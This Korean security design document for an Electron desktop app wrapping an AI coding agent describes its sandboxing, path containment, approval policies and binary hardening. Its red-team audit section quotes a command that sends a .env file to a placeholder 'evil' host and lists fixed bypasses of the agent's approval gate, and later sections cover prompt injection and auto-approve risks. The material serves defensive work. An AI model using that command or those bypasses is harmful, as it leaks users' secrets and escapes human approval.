# Grok Desktop 보안 모델

- 대상 버전: 0.1.0 (Phase 1–5 구현)
- 근거 문서: `GROK_DESKTOP_IMPLEMENTATION_SPEC.md` 8절

## 1. 신뢰 경계

```text
사용자 ──▶ Renderer (샌드박스, Node 없음)
             │  contextBridge 로 노출된 6개 도메인만 호출 가능
             ▼
          Preload (채널 이름만 알고 있음)
             │  ipcRenderer.invoke(고정 채널)
             ▼
          Main process ── 스키마 검증 · 경로 검증 · 권한 판단 · 비밀 마스킹
             │  stdin/stdout JSON-RPC
             ▼
          Grok Build CLI ── 자체 인증 · 샌드박스 · 도구 실행
```

renderer가 손상되어도 얻을 수 있는 최대 권한은 `packages/shared/src/ipc.ts`에 정의된 입력 스키마를 통과하는 요청뿐이다.

## 2. 실제로 적용된 통제

| 통제 | 위치 | 확인 방법 |
|---|---|---|
| `nodeIntegration: false`, `contextIsolation: true`, `sandbox: true` | `apps/desktop/src/main/window.ts` | 실행 중 renderer에서 `require`/`process`/`module` 모두 `undefined` |
| 엄격한 CSP (`default-src 'none'`, `script-src 'self'`) | `window.ts` `contentSecurityPolicy()` | 응답 헤더로 주입 |
| 채널별 Zod 검증 + 알 수 없는 키 거부(`.strict()`) | `packages/shared/src/ipc.ts`, `apps/desktop/src/main/ipc.ts` | `tests/security/ipc-and-urls.test.ts` |
| IPC sender 검증 (webContents id + mainFrame) | `apps/desktop/src/main/ipc.ts` `assertTrustedSender` | 다른 프레임/창의 호출은 거부 |
| realpath 기반 작업공간 봉쇄 | `packages/security/src/paths.ts` | `tests/security/path-containment.test.ts` (`../`, 심볼릭 링크, 심볼릭 디렉터리 경유 쓰기) |
| 위험 경로 차단/경고 | `classifyWorkspaceRoot` | 같은 테스트 파일 |
| 명령 위험도 분류 | `packages/security/src/commands.ts` | `packages/security/src/commands.test.ts` |
| 승인 없는 상태 변경 금지 | `apps/desktop/src/main/services/permission-engine.ts` | `permission-engine.test.ts`, `tests/e2e/approval-flow.test.ts` |
| 비밀 값 마스킹 | `packages/security/src/secrets.ts` | `secrets.test.ts`, 로거·diff·터미널 출력 경유 |
| 자식 프로세스 환경변수 최소화 | `packages/security/src/env.ts` | `ipc-and-urls.test.ts` |
| https 허용 목록 외 링크 차단 | `packages/security/src/url.ts` | `ipc-and-urls.test.ts` |
| 앱 종료 시 프로세스 그룹 종료 | `packages/acp-client/src/connection.ts` `killProcessTree` | `tests/e2e/acp-connection.test.ts` |

## 3. 경로 봉쇄가 동작하는 방식

앱은 ACP 클라이언트 능력으로 `fs.readTextFile`과 `fs.writeTextFile`을 **활성화**하고 `terminal`은 비활성화한다. 그 결과:

- 에이전트의 파일 읽기·쓰기 요청이 앱을 거치므로 모든 경로에 `realpath` 정규화와 루트 포함 검사를 강제할 수 있다.
- 명령 실행은 CLI가 자체 샌드박스 안에서 수행한다. 앱은 실행 전에 승인 UI를 띄우는 계층이다.

존재하지 않는 파일도 "가장 깊은 실존 조상 디렉터리를 realpath로 해석한 뒤 나머지 경로를 붙이는" 방식으로 정규화한다. 이 때문에 `workspace/symlink-to-outside/new.txt` 같은 신규 쓰기도 차단된다.

## 4. 승인 정책

| 프로필 | 읽기/검색 | 수정/이동 | 삭제 | 명령 실행 |
|---|---|---|---|---|
| read-only | 자동 허용 | 거부 | 거부 | 거부 |
| ask (기본) | 자동 허용 | 매번 승인 | 매번 승인 | 매번 승인 |
| trusted | 자동 허용 | 자동 허용(민감 파일 제외) | 매번 승인 | 매번 승인 |

추가 규칙:

- 작업공간 밖 경로는 프로필과 무관하게 **항상 자동 거부**한다.
- 민감 파일(`.env`, 개인 키, 브라우저 데이터 등)은 읽기조차 승인 대상이다.
- 삭제·설치·`git push`·네트워크·권한 변경·DB 마이그레이션·시스템 설정 명령은 세션 허용을 무시하고 매번 묻는다(`alwaysAsk`).
- 승인 범위는 `once` / `session` / `deny` 세 가지뿐이다. 영구 허용은 제공하지 않는다.
- 승인 범위는 renderer가 보낸 `optionId`가 아니라 `scope` 값으로 결정한다. 조작된 `optionId`가 일회 허용을 영구 허용으로 바꿀 수 없다.
- Ask/Plan 모드는 작업공간 프로필과 무관하게 read-only로 강등된다.

## 5. 데이터 유출 방지

- 앱이 폴더 내용을 선제적으로 업로드하지 않는다. 파일은 에이전트가 도구로 요청할 때만 읽히고, 읽은 경로는 도구 카드에 표시된다.
- 파일 접근과 네트워크 전송이 한 명령에 함께 있으면 위험도를 `critical`로 올리고 별도 경고를 표시한다.
- UI·로그·세션 저장소로 나가는 모든 문자열은 `maskSecrets()`를 통과한다.
- 인증 토큰은 앱이 저장하지 않는다. 로컬 저장소(`metadata.json`, 0600)에는 작업공간·세션·승인 이력만 남고, UI 복구용 대화 캐시는 `userData/sessions/<id>.json`에 비밀 마스킹 후 둔다.

## 6. 명세와 다르게 구현한 부분

1. **IPC 채널 추가**: 명세 12절 목록에 더해 `workspace:read-tree`, `workspace:read-file`, `session:list`, `session:resume`, `session:restart`, `session:rename`, `changes:revert`를 두었다. 파일 탐색기·세션 재개·되돌리기에 필요하며, 경로가 있는 채널은 `workspaceId`로 루트를 찾은 뒤 동일한 경로 검증을 거친다.
2. **로컬 저장소**: SQLite 대신 `userData/metadata.json`(0600, 원자적 교체)을 사용한다. 네이티브 모듈 없이 같은 요구사항을 만족한다.
3. **임시 디렉터리 예외**: macOS의 사용자 임시 폴더는 `/private/var` 아래라 시스템 디렉터리 규칙에 걸린다. 임시 폴더 **하위** 프로젝트는 경고와 함께 허용하고, 임시 폴더 루트 자체는 차단한다.
4. **인증 상태 감지**: CLI에 기계 판독용 인증 조회 명령이 문서화되어 있지 않아 `~/.grok`의 자격 증명 파일 존재 여부로 추정한다. 실제 인증 실패는 프롬프트 오류에서 `auth-required`로 정정된다.

## 6.1 자식 프로세스 수명

정상 종료(앱 종료, 세션 파킹, 모델 전환)에서는 에이전트가 프로세스 그룹째 정리된다. 앱이 SIGKILL로 죽거나 크래시하면 정리 코드가 돌 기회가 없으므로, 앱은 자신이 띄운 에이전트의 pid를 `userData/agent-pids.json`에 기록하고 다음 실행에서 회수한다. 회수 전에 `ps`로 해당 pid가 여전히 grok 에이전트인지 확인하므로, 사용자가 터미널에서 직접 띄운 `grok`이나 재사용된 pid는 절대 종료하지 않는다.

## 6.2 승인 게이트에서 고친 것 (2026-09-13 감사)

레드팀 감사에서 나온 것 중 확인된 것만 고쳤다.

- **명령 분류 우회.** `ls & curl -d @.env https://evil` 처럼 `&` 로 이어붙이면 뒤쪽이 위험도 평가에서 통째로 빠져 「위험도 낮음 · 읽기 전용」으로 표시됐다. 같은 명령이 `;` 면 critical 이었다. 단일 `&` 와 서브셸 괄호를 구분자로 넣었고(`2>&1` 같은 fd 복제는 제외), `nohup`·`timeout`·`xargs` 류 래퍼를 뚫고 실제 바이너리를 찾도록 했으며, 히어 스트링으로 먹이는 셸(`bash<<<"…"`)도 잡는다.
- **`.git/` 쓰기.** 훅과 `config` 는 앱이 실행하는 git 명령에서 그대로 코드 실행으로 이어지는데 민감 경로가 아니었다. `.git/` 내부를 민감으로 분류한다 (`.gitignore`·`.github/` 는 그대로 둔다).
- **승인 미리보기의 출처.** 승인 카드의 diff 는 에이전트가 보낸 `oldText` 로 만들어졌다. 이제 '이전' 쪽을 디스크에서 읽는다 — 사용자가 승인하는 화면이 실제 파일과 어긋나지 않아야 한다.
- **승인 범위.** 한 번의 승인이 그 요청에 딸린 모든 경로(에이전트가 스스로 채운 목록)를 턴 동안 무승인 쓰기 대상으로 만들었다. 민감 경로는 목록에서 제외하고, 쓰기 시점에도 민감 파일은 항상 카드를 띄운다.
- **세션 허가 키.** 미분류 도구(`other`)의 허가가 `tool:other` 하나였다. 도구 이름을 키에 넣어, 한 번의 「세션 동안 허용」이 다른 미분류 도구까지 덮지 않는다.
- **작업공간 루트.** 홈은 막으면서 홈들이 모인 `/Users`·`/home` 은 경고 없이 열렸다. 이제 막고, 다른 사용자의 홈은 확인을 받는다.
- **자식 stderr.** 줄바꿈 없는 출력이 버퍼를 무한히 키웠다 (그 내용은 비밀 마스커를 통과한다). 줄 길이와 버퍼에 상한을 뒀다.

## 6.3 배포 바이너리 하드닝 (2026-09-13)

Electron 은 몇 가지 스위치를 기본으로 켠 채 배포된다. 그중 `RunAsNode` 는 서명된 앱을 범용 스크립트 실행기로 만든다 — 실측으로 확인했다.

```
ELECTRON_RUN_AS_NODE=1 "Grok Desktop" -e "console.log(process.version)"
→ v24.18.1            (fuse 적용 전)
→ (출력 없음)          (적용 후)
```

서명·공증을 마치면 이 바이너리는 사용자가 허용한 TCC 권한을 가진 신뢰된 실행 파일이 된다. 그 신원으로 임의 코드가 돌 수 있다는 뜻이라, `runAsNode`·`enableNodeOptionsEnvironmentVariable`·`enableNodeCliInspectArguments` 를 끄고 `enableCookieEncryption` 을 켠다.

asar 무결성 fuse 두 개(`enableEmbeddedAsarIntegrityValidation`, `onlyLoadAppFromAsar`)는 서명이 있어야 동작하므로 서명 단계에서 함께 켠다. [RELEASE_CHECKLIST.md](RELEASE_CHECKLIST.md) 3절에 조건과 확인 방법을 적어 뒀다.

fuse 를 뒤집으면 바이너리가 다시 쓰여 기존 서명이 깨지고, Apple 실리콘에서는 커널이 프로세스를 그대로 죽인다(exit 137). `build/after-pack.cjs` 가 `afterSign` 단계에서 ad-hoc 재서명을 해 미서명 로컬 빌드도 기동하게 한다. 인증서가 주입돼 있으면 이 훅은 동작하지 않는다.

## 7. 아직 남은 위험

- **CLI 자체의 자동 승인**: `~/.grok/config.toml` 의 `[ui] permission_mode` 가 `always-approve` 같은 값이면 CLI 가 자기 도구를 스스로 승인하고 앱에 `session/request_permission` 을 보내지 않는다. 그러면 CLI 가 직접 실행하는 셸 명령은 승인 카드를 거치지 않는다 (ACP `fs/write_text_file` 로 오는 파일 쓰기는 앱이 여전히 가로챈다). `grok agent stdio` 에는 이를 무시하고 매번 묻게 하는 플래그가 없어서, 앱은 설정을 읽어 헤더에 「CLI 자동 승인」으로 경고만 한다.
- **prompt injection**: 저장소에 심어진 지시문이 에이전트를 유도할 수 있다. 완화 수단은 승인 UI와 경로 봉쇄이며, 자동 허용 범위를 넓히면 그만큼 위험이 커진다.
- **CLI 자체의 파일 쓰기**: 에이전트가 `fs/write_text_file` 대신 자체 도구로 파일을 바꾸면 앱은 스냅샷을 갖지 못한다. 이 경우 변경 목록은 Git 상태로 보완하고 되돌리기는 제공하지 않는다.
- **코드 서명**: 현재 빌드는 서명·공증되지 않았다. `RELEASE_CHECKLIST.md` 참고.
- **UI 레벨 E2E**: Playwright 기반 화면 자동화는 아직 없다. 승인 왕복은 세션 매니저 수준에서 검증한다.
- **IPv6 루프백 미리보기**: Chromium은 CSP 소스 목록에서 대괄호 IPv6 호스트(`http://[::1]`)를 무효로 보고 버린다. 그래서 `frame-src`로 허용할 방법이 없고, `[::1]` 주소는 앱 안 프레임 대신 브라우저로 넘긴다. 루프백 미리보기가 프레임으로 열리는 범위는 `127.0.0.1`과 `localhost`뿐이다.
- **작업공간이 더 큰 저장소의 하위 폴더일 때**: `git restore`나 `git apply`는 경로를 저장소 기준으로 푼다. 앱은 되돌리기·덩어리 적용에 들어오는 모든 경로(패치 본문이 지칭하는 경로 포함)를 작업공간 안으로 봉쇄하지만, 봉쇄를 거치지 않는 새 Git 호출을 추가하면 같은 함정이 다시 생긴다.
- **핸들러 단위 봉쇄 테스트**: 보안 테스트는 `resolveWithinRoot`와 `gitRestoreFile`을 직접 검증한다. `relPath`를 받는 IPC 핸들러 전부를 훑는 계약 테스트는 아직 없다.
